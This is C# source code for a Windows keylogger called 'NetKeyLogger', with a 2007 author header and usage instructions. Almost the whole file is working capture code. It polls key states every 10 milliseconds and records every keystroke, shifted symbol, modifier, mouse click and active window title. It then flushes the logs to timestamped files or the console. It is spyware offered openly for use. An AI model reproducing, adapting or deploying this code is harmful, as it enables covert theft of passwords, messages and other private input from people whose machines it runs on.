/* *************************************************************************** *
 *  Title: .NET Keylogger
 * Author: D3t0x
 *   Date: 5/21/2007
 *   Type: Open Source
 * 
 * This software is based off "ArticleKeyLog";
 * which can be found at www.z3d0clan.com.
 * Alexander Kent is the original author. I have
 * modified the source to include some more advanced
 * logging features I thought were needed.
 * 
 * Added features:
 * » Focused/Active window title logging.
 * » Accurate character detection.(His version would display only CAPS)
 * » Log file formatting.
 * » Custom args [below]
 * *************************************************************************** *
 * Usage:
 * You have several args you can pass to customize the
 * program's execution.
 * netLogger.exe -f [filename] -m [mode] -i [interval] -o [output]
 *                    -f [filename](Name of the file. ".log" will always be the ext.)
 *                    -m ['hour' or 'day'] saves logfile name appended by the hour or day.
 *                    -i [interval] in milliseconds, flushes the buffer to either the
 *                                                    console or file. Shorter time = more cpu usage.
 *                                                    10000=10seconds : 60000=1minute : etc...
 *                    -o ['file' or 'console'] Outputs all data to either a file or console.
 * *************************************************************************** *
 * ArticleKeyLog - Basic Keystroke Mining
 * Date:          05/12/2005
 * Author:          D3t0x
 * d.t0x@hotmail.com
 * (www.z3d0clan.com)
 * *************************************************************************** */

using System;
using System.IO;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace NetKeyLogger
{
    public class Keylogger
    {
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey); // Keys enumeration
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Int32 vKey);
        [DllImport("User32.dll")]
        public static extern int GetWindowText(int hwnd, StringBuilder s, int nMaxCount);
        [DllImport("User32.dll")]
        public static extern int GetForegroundWindow();

        private System.String keyBuffer;
        private System.Timers.Timer timerKeyMine;
        private System.Timers.Timer timerBufferFlush;
        private System.String hWndTitle;
        private System.String hWndTitlePast;
        public System.String LOG_FILE;
        public System.String LOG_MODE;
        public System.String LOG_OUT;
        private bool tglAlt = false;
        private bool tglControl = false;
        private bool tglCapslock = false;

        public Keylogger()
        {
            hWndTitle = ActiveApplTitle();
            hWndTitlePast = hWndTitle;

            //
            // keyBuffer
            //
            keyBuffer = "";

            // 
            // timerKeyMine
            // 
            this.timerKeyMine = new System.Timers.Timer();
            this.timerKeyMine.Enabled = true;
            this.timerKeyMine.Elapsed += new System.Timers.ElapsedEventHandler(this.timerKeyMine_Elapsed);
            this.timerKeyMine.Interval = 10;

            // 
            // timerBufferFlush
            //
            this.timerBufferFlush = new System.Timers.Timer();
            this.timerBufferFlush.Enabled = true;
            this.timerBufferFlush.Elapsed += new System.Timers.ElapsedEventHandler(this.timerBufferFlush_Elapsed);
            this.timerBufferFlush.Interval = 1800000; // 30 minutes
        }

        static void Main()
        {
            Keylogger kl = new Keylogger();
            kl.Enabled = true;
            Console.ReadLine();
            kl.Flush2File("test.txt");

        }

        public static string ActiveApplTitle()
        {
            int hwnd = GetForegroundWindow();
            StringBuilder sbTitle = new StringBuilder(1024);
            int intLength = GetWindowText(hwnd, sbTitle, sbTitle.Capacity);
            if ((intLength <= 0) || (intLength > sbTitle.Length)) return "unknown";
            string title = sbTitle.ToString();
            return title;
        }

        private void timerKeyMine_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            hWndTitle = ActiveApplTitle();

            if (hWndTitle != hWndTitlePast)
            {
                if (LOG_OUT == "file")
                    keyBuffer += "[" + hWndTitle + "]";
                else
                {
                    Flush2Console("[" + hWndTitle + "]", true);
                    if (keyBuffer.Length > 0)
                        Flush2Console(keyBuffer, false);
                }
                hWndTitlePast = hWndTitle;
            }

            foreach (System.Int32 i in Enum.GetValues(typeof(Keys)))
            {
                if (GetAsyncKeyState(i) == -32767)
                {
                    //Console.WriteLine(i.ToString()); // Outputs the pressed key code [Debugging purposes]


                    if (ControlKey)
                    {
                        if (!tglControl)
                        {
                            tglControl = true;
                            keyBuffer += "<Ctrl=On>";
                        }
                    }
                    else
                    {
                        if (tglControl)
                        {
                            tglControl = false;
                            keyBuffer += "<Ctrl=Off>";
                        }
                    }

                    if (AltKey)
                    {
                        if (!tglAlt)
                        {
                            tglAlt = true;
                            keyBuffer += "<Alt=On>";
                        }
                    }
                    else
                    {
                        if (tglAlt)
                        {
                            tglAlt = false;
                            keyBuffer += "<Alt=Off>";
                        }
                    }

                    if (CapsLock)
                    {
                        if (!tglCapslock)
                        {
                            tglCapslock = true;
                            keyBuffer += "<CapsLock=On>";
                        }
                    }
                    else
                    {
                        if (tglCapslock)
                        {
                            tglCapslock = false;
                            keyBuffer += "<CapsLock=Off>";
                        }
                    }

                    if (Enum.GetName(typeof(Keys), i) == "LButton")
                        keyBuffer += "<LMouse>";
                    else if (Enum.GetName(typeof(Keys), i) == "RButton")
                        keyBuffer += "<RMouse>";
                    else if (Enum.GetName(typeof(Keys), i) == "Back")
                        keyBuffer += "<Backspace>";
                    else if (Enum.GetName(typeof(Keys), i) == "Space")
                        keyBuffer += " ";
                    else if (Enum.GetName(typeof(Keys), i) == "Return")
                        keyBuffer += "<Enter>";
                    else if (Enum.GetName(typeof(Keys), i) == "ControlKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "LControlKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "RControlKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "LControlKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "ShiftKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "LShiftKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "RShiftKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "Delete")
                        keyBuffer += "<Del>";
                    else if (Enum.GetName(typeof(Keys), i) == "Insert")
                        keyBuffer += "<Ins>";
                    else if (Enum.GetName(typeof(Keys), i) == "Home")
                        keyBuffer += "<Home>";
                    else if (Enum.GetName(typeof(Keys), i) == "End")
                        keyBuffer += "<End>";
                    else if (Enum.GetName(typeof(Keys), i) == "Tab")
                        keyBuffer += "<Tab>";
                    else if (Enum.GetName(typeof(Keys), i) == "Prior")
                        keyBuffer += "<Page Up>";
                    else if (Enum.GetName(typeof(Keys), i) == "PageDown")
                        keyBuffer += "<Page Down>";
                    else if (Enum.GetName(typeof(Keys), i) == "LWin" || Enum.GetName(typeof(Keys), i) == "RWin")
                        keyBuffer += "<Win>";

                    /* ********************************************** *
                     * Detect key based off ShiftKey Toggle
                     * ********************************************** */
                    if (ShiftKey)
                    {
                        if (i >= 65 && i <= 122)
                        {
                            keyBuffer += (char)i;
                        }
                        else if (i.ToString() == "49")
                            keyBuffer += "!";
                        else if (i.ToString() == "50")
                            keyBuffer += "@";
                        else if (i.ToString() == "51")
                            keyBuffer += "#";
                        else if (i.ToString() == "52")
                            keyBuffer += "$";
                        else if (i.ToString() == "53")
                            keyBuffer += "%";
                        else if (i.ToString() == "54")
                            keyBuffer += "^";
                        else if (i.ToString() == "55")
                            keyBuffer += "&";
                        else if (i.ToString() == "56")
                            keyBuffer += "*";
                        else if (i.ToString() == "57")
                            keyBuffer += "(";
                        else if (i.ToString() == "48")
                            keyBuffer += ")";
                        else if (i.ToString() == "192")
                            keyBuffer += "~";
                        else if (i.ToString() == "189")
                            keyBuffer += "_";
                        else if (i.ToString() == "187")
                            keyBuffer += "+";
                        else if (i.ToString() == "219")
                            keyBuffer += "{";
                        else if (i.ToString() == "221")
                            keyBuffer += "}";
                        else if (i.ToString() == "220")
                            keyBuffer += "|";
                        else if (i.ToString() == "186")
                            keyBuffer += ":";
                        else if (i.ToString() == "222")
                            keyBuffer += "\"";
                        else if (i.ToString() == "188")
                            keyBuffer += "<";
                        else if (i.ToString() == "190")
                            keyBuffer += ">";
                        else if (i.ToString() == "191")
                            keyBuffer += "?";
                    }
                    else
                    {
                        if (i >= 65 && i <= 122)
                        {
                            keyBuffer += (char)(i + 32);
                        }
                        else if (i.ToString() == "49")
                            keyBuffer += "1";
                        else if (i.ToString() == "50")
                            keyBuffer += "2";
                        else if (i.ToString() == "51")
                            keyBuffer += "3";
                        else if (i.ToString() == "52")
                            keyBuffer += "4";
                        else if (i.ToString() == "53")
                            keyBuffer += "5";
                        else if (i.ToString() == "54")
                            keyBuffer += "6";
                        else if (i.ToString() == "55")
                            keyBuffer += "7";
                        else if (i.ToString() == "56")
                            keyBuffer += "8";
                        else if (i.ToString() == "57")
                            keyBuffer += "9";
                        else if (i.ToString() == "48")
                            keyBuffer += "0";
                        else if (i.ToString() == "189")
                            keyBuffer += "-";
                        else if (i.ToString() == "187")
                            keyBuffer += "=";
                        else if (i.ToString() == "92")
                            keyBuffer += "`";
                        else if (i.ToString() == "219")
                            keyBuffer += "[";
                        else if (i.ToString() == "221")
                            keyBuffer += "]";
                        else if (i.ToString() == "220")
                            keyBuffer += "\\";
                        else if (i.ToString() == "186")
                            keyBuffer += ";";
                        else if (i.ToString() == "222")
                            keyBuffer += "'";
                        else if (i.ToString() == "188")
                            keyBuffer += ",";
                        else if (i.ToString() == "190")
                            keyBuffer += ".";
                        else if (i.ToString() == "191")
                            keyBuffer += "/";
                    }
                }
            }
        }

        #region toggles
        public static bool ControlKey
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.ControlKey) & 0x8000); }
        } // ControlKey
        public static bool ShiftKey
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey) & 0x8000); }
        } // ShiftKey
        public static bool CapsLock
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.CapsLock) & 0x8000); }
        } // CapsLock
        public static bool AltKey
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.Menu) & 0x8000); }
        } // AltKey
        #endregion

        private void timerBufferFlush_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            if (LOG_OUT == "file")
            {
                if (keyBuffer.Length > 0)
                    Flush2File(LOG_FILE);
            }
            else
            {
                if (keyBuffer.Length > 0)
                    Flush2Console(keyBuffer, false);
            }
        }

        public void Flush2Console(string data, bool writeLine)
        {
            if (writeLine)
                Console.WriteLine(data);
            else
            {
                Console.Write(data);
                keyBuffer = ""; // reset
            }
        }

        public void Flush2File(string file)
        {
            string AmPm = "";
            try
            {
                if (LOG_MODE == "hour")
                {
                    if (DateTime.Now.TimeOfDay.Hours >= 0 && DateTime.Now.TimeOfDay.Hours <= 11)
                        AmPm = "AM";
                    else
                        AmPm = "PM";
                    file += "_" + DateTime.Now.ToString("hh") + AmPm + ".log";
                }
                else
                    file += "_" + DateTime.Now.ToString("MM.dd.yyyy") + ".log";

                FileStream fil = new FileStream(file, FileMode.Append, FileAccess.Write);
                using (StreamWriter sw = new StreamWriter(fil))
                {
                    sw.Write(keyBuffer);
                }

                keyBuffer = ""; // reset
            }
            catch (Exception ex)
            {
                // Uncomment this to help debug.
                // Console.WriteLine(ex.Message);
                throw;
            }
        }

        #region Properties
        public System.Boolean Enabled
        {
            get
            {
                return timerKeyMine.Enabled && timerBufferFlush.Enabled;
            }
            set
            {
                timerKeyMine.Enabled = timerBufferFlush.Enabled = value;
            }
        }

        public System.Double FlushInterval
        {
            get
            {
                return timerBufferFlush.Interval;
            }
            set
            {
                timerBufferFlush.Interval = value;
            }
        }

        public System.Double MineInterval
        {
            get
            {
                return timerKeyMine.Interval;
            }
            set
            {
                timerKeyMine.Interval = value;
            }
        }
        #endregion

    }
}